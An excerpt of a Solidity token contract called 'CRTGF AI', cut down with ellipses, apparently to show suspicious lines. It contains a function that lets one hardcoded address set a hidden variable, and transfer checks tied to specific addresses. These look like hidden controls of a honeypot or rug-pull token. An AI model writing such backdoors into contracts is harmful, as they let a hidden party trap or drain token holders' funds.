...
contract STMAP is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0xd750C5624F899De1fd79b0d44B1c0E24E1038212 );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x88eFdA8c5b5539beCfb1E70C914b899DcDca3cCc 
    ...
    constructor() {
        _name = unicode"CRTGF AI";
        _symbol = unicode"CRTGFAI";
